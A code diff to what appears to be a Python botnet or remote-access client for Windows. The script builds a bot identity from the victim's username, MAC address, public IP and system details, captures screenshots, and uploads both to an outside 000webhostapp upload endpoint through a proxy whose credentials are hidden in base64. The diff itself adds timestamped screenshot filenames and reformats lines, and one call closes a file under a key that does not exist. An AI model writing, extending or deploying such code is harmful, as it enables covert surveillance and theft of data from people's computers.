@@ -11,7 +11,7 @@ import shutil
 import _winreg as wreg
 from uuid import getnode as get_mac
 import json
-
+from datetime import datetime
 import requests
 
 uploadURL = 'http://monohydric-variatio.000webhostapp.com/upload.php'
@@ -83,7 +83,8 @@ def getSysDetails():
     nodename = platform.node()
     global botname
     botname = locale + '_' + username + '_' + macAddr
-    identification = {'botname': botname, 'locale': locale, 'username': username, 'macAddr': macAddr, 'publicIP': publicIP,
+    identification = {'botname': botname, 'locale': locale, 'username': username, 'macAddr': macAddr,
+                      'publicIP': publicIP,
                       'platform': plat, 'architecture': arch, 'Name': nodename}
     iD = identification
     return json.dumps(iD)
@@ -91,15 +92,18 @@ def getSysDetails():
 
 def screenshot():
     dirpath = tempfile.mkdtemp()
-    ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
-    files = {'fileToUpload': open(dirpath + "\img.jpg", 'rb')}
+    now = str(datetime.now()).replace(" ", "_")
+    now = now.replace(":", "_")
+    ImageGrab.grab().save(dirpath + now + "\img.jpg", "JPEG")
+    files = {'fileToUpload': open(dirpath + now + "\img.jpg", 'rb')}
     r = sendFile(files)
     files['fileToUpload'].close()
     shutil.rmtree(dirpath)
 
 
 def sendFile(files=None):
-    response = requests.post(uploadURL, data={'botname': botname}, files=files, proxies={'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"})
+    response = requests.post(uploadURL, data={'botname': botname}, files=files, proxies={
+        'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"})
     return response
 
 
@@ -123,10 +127,10 @@ def initialize():
     global identification
     identification = getSysDetails()  # send sysDetails on initialisation and set hostname for identifying bot
     dirpath = tempfile.mkdtemp()
-    files = open(dirpath+'\identity.txt', 'wb')
+    files = open(dirpath + '\identity.txt', 'wb')
     files.write(json.dumps(identification))
     files.close()
-    files = {'fileToUpload': open(dirpath+'\identity.txt', 'rb')}
+    files = {'fileToUpload': open(dirpath + '\identity.txt', 'rb')}
     r = sendFile(files)
     files['file'].close()
     shutil.rmtree(dirpath)
